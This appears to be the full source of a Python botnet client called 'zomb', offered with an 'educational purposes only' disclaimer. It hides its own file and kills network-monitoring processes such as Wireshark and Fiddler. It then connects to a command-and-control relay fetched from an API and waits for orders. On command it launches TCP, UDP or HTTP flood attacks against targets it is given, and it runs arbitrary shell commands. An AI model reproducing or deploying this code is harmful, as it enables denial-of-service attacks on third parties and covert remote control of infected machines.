from socket import socket as sock
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_KEEPALIVE, SOCK_DGRAM
from threading import Thread
from time import sleep, time
from os import system, path as ospath
import requests
from speedtest import Speedtest
from json import load
from cryptography.fernet import Fernet
from random import uniform, choice, randint, random
from requests import get as rget
from tempfile import gettempdir
from sys import argv
from ctypes import windll
from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess



__filename__="zomb"
__version__="2.0"
__author__="4lxprime"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."



# Configuration
RELAY_PORT: int = 5001
API_URL: str = "http://localhost/phybot/api/v2"
URL_KEY: str = "VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
KEY: str = "b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
ENC_KEY: str = "BkpVa0VQa4iXquxMtbWKHDKdyjWmZ6BGb7AM94ED_go="
ENC_KEY_D: str = "kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="

PAYLOAD_1: str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # 100 * 1oct request
PAYLOAD: str = 150*PAYLOAD_1

BASE_UA: list[str] = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

DEBUG: bool = True

raddr: list = []
stu: list = []
old_gen_key: list[str] = []
gen_key: list[str] = []

try:
    speed=[0]
    Speedtest()
    stu.append(True)
except:
    speed=[0]
    stu.append(False)
    
FERNET=Fernet(ENC_KEY)
FERNET_D=Fernet(ENC_KEY_D)



def hide():
    windll.kernel32.SetFileAttributesW(argv[0], 2)
    
def log(data: str) -> None: 
    if DEBUG: log(data)

def crypt_d(
    msg: str,
    encrypt: bool = True,
) -> bytes:
    if encrypt: msg = FERNET_D.encrypt(msg)
    else: msg = FERNET_D.decrypt(msg)

    return msg

def crypt(
    msg: str,
    encrypt: bool = True,
):
    if encrypt: msg = FERNET.encrypt(msg)
    else: msg = FERNET.decrypt(msg)

    return msg


def rand_ua() -> str:
    return choice(BASE_UA) % (random() + 5, random() + randint(1, 8), random(), randint(2000, 2100), randint(92215, 99999), (random() + randint(3, 9)), random())

def dos(
    s: sock,
    attack: tuple[str, int],
    tps: int,
    method: str,
) -> None: # start dos attack with socket and attack target
    tps += int(time()) # set the attack time with actual time + attack time

    match method:
        case "TCP":
            log("TCP")
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(bytes(PAYLOAD, "utf-8"))

                except: pass

        case "UDP":
            log("UDP")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)

                except: pass

        case "HTTP":
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(f'GET / HTTP/1.1\r\nHost: {attack[0]}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())

                except: s.close()

        case _:
            log("Unknown")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)

                except: pass

def speedtest() -> None:
    stu.clear()

    try:
        Speedtest()
        stu.append(True)

    except: stu.append(False)

def _stu():
    while 1:
        for i in stu:
            if i:
                try:
                    test: Speedtest = Speedtest()
                    net: float = test.upload()
                    net: float = round(net / 8000, 3) # but here in mbps

                    if sum(speed) != 0: speed.clear()
                    
                    speed.append(net)

                    log(sum(speed))

                except: pass

                sleep(160)

def getkey() -> None:
    while 1:
        for i in raddr:
            url: str = f"{API_URL}/gkey.php?urlkey={URL_KEY}&rip={i}"
            res: str = rget(url, timeout=5000).text
            
            if res != "error":
                gen_key.clear()
                gen_key.append(res)

            else: log(f"error: {res}")

        sleep(600)

def main() -> None:
    c2: sock = sock(AF_INET, SOCK_STREAM)
    c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

    while 1:
        try:
            RELAY_ADDR: str = rget(f"{API_URL}/dispatch.php?urlkey={URL_KEY}", timeout=5000).text

            raddr.clear()
            raddr.append(RELAY_ADDR)

            c2.connect((RELAY_ADDR, RELAY_PORT))

            log((RELAY_ADDR, RELAY_PORT))

            while 1:
                data: str = c2.recv(1024).decode()

                if 'Username' in data:
                    c2.send('BOT'.encode())
                    log("send bot")
                    break

            while 1:
                data: str = c2.recv(1024).decode()

                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    log("send bot string")
                    break

            break
        except:
            sleep(240)

    while 1:
        try:
            data: str = c2.recv(1024).decode()
            
            if not data: break
            
            log(data)
            
            match True:
                case data.startswith("b'gAAA"):
                    try:
                        data: str = data.replace("b'gAAA", "gAAA").replace("'", "").encode()
                        data = crypt_d(data, encrypt=False).decode()

                    except Exception as e:
                        log(e)

                case data.startswith("GK"):
                    data = data.replace("GK", "")

                    if len(gen_key) != 0:
                        data = crypt(data, encrypt=False).decode()

                        if data.startswith("GKEY"):
                            data = data.replace("GKEY:[", "").replace("]", "")

                            global old_gen_key
                            
                            old_gen_key = gen_key

                            gen_key.clear()
                            gen_key.append(data)

                    else:
                        data = crypt_d(data, encrypt=False).decode()

                        if data.startswith("GKEY"):
                            data = data.replace("GKEY:[", "").replace("]", "")
                            gen_key.clear()
                            gen_key.append(data)

                case _: pass
            

            args: list[str] = data.split(' ')
            command: str = args[0].upper()

            log(command)

            match command:
                case "ATTACK":
                    arg=data
                    log(arg)
                    arg=arg.replace("ATTACK ", "")

                    s: sock = "UDP" # udp by default
                    method: str = None

                    match True:
                        case arg.endswith("UPD"):
                            s = sock(AF_INET, SOCK_DGRAM)
                            method = "UDP"

                        case arg.endswith("TCP"):
                            s = sock(AF_INET, SOCK_STREAM)
                            method = "TCP"

                        case arg.endswith("HTTP"):
                            s = sock(AF_INET, SOCK_STREAM)
                            method = "HTTP"

                        case _:
                            s = sock(AF_INET, SOCK_DGRAM)

                    dp = arg.find(":") # find separator (ex: 127.0.0.1:8080)

                    attack_ip: str = arg[0:dp] # target ip
                    attack_p: str = arg[dp:arg.find("/")] # target port
                    attack_p: str = attack_p.replace(":","")
                    attack_port: int = int(attack_p)

                    attack: tuple[str, int] = (attack_ip, attack_port) # all the target infos

                    attack_time: str = arg[arg.find("/"):arg.find("-")] # get attack time
                    attack_time = attack_time.replace("/", "")

                    Thread(target=dos, args=[
                        s,
                        attack,
                        attack_time,
                        method,
                    ]).start()

                case 'PING':
                    c2.send(f'PONG[p:{KEY}]'.encode())

                case 'NETSPEED':
                    c2.send(str(round(sum(speed))).encode())

                case 'CMD':
                    cmd: str = data.replace("CMD ", "")
                    system(cmd)

                case "METHOD":
                    if not ospath.exists(f"{gettempdir()}\method.json"):
                        with open(f"{gettempdir()}\method.json", "w") as f:
                            f.write("{}")

                    arg: str = data.replace("METHOD ", "")
                    args: list[str] = arg.split(" ")
                    log(args)

                    if args[0] == 'CREATE':
                        name: str = args[1]
                        name = f"'{name}'" # idk why i do that
                        log(name)
                        
                        cmd: str = args.replace("CREATE ", "").replace(f"{name} ", "")
                        cmd = crypt(cmd).decode()
                        log(cmd)

                        tb: str = None

                        with open(f"{gettempdir()}\method.json", "r") as f:
                            tb1: str = load(f)
                            tb1 = tb1.replace('{"', '"').replace("{}", "").replace("}    ", "") # here i remind that spaces are useful
                            tb = f'"{name}": {{"name": "{name}", "command": "{cmd}"}}'

                        if not tb1 is None: tb = "{"+tb1+",\n"+tb+"\n}    "
                        else: tb = "{"+tb+"\n}    "

                        tb = tb.replace("{{", "{").replace("}}", "}")

                        with open(f"{gettempdir()}\method.json", "w") as f:
                            f.write(tb.replace("'", '"').replace("{,", "{").replace('b"', '"'))

                    else:
                        name: str = args[0]
                        
                        with open(f"{gettempdir()}\method.json", "r") as f:
                            tb: str = load(f)[name]["command"]
                            cmd = crypt(tb.encode(), encrypt=False).decode()
                            log(cmd)
                            system(cmd)

            if data == "METHOD CLEAR":
                with open(f"{gettempdir()}\method.json", "w") as f:
                    f.write("{}")

        except: break

    c2.close()
    main()

class netblock():
    def net(self, names: list[str]) -> None:
        for proc in process_iter():
            try:
                for name in names:
                    if name.lower() in proc.name().lower():
                        proc.kill()

            except (NoSuchProcess, AccessDenied, ZombieProcess): pass

    def block(self) -> None:
        forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
        return self.net(names=forbidden)

netblock().block()

if __name__ == '__main__':
    try:
        print(f"\nLegit: {__legit__}\n")

        Thread(target=_stu).start()
        Thread(target=speedtest).start()
        Thread(target=getkey).start()

        hide()
        main()

    except: pass
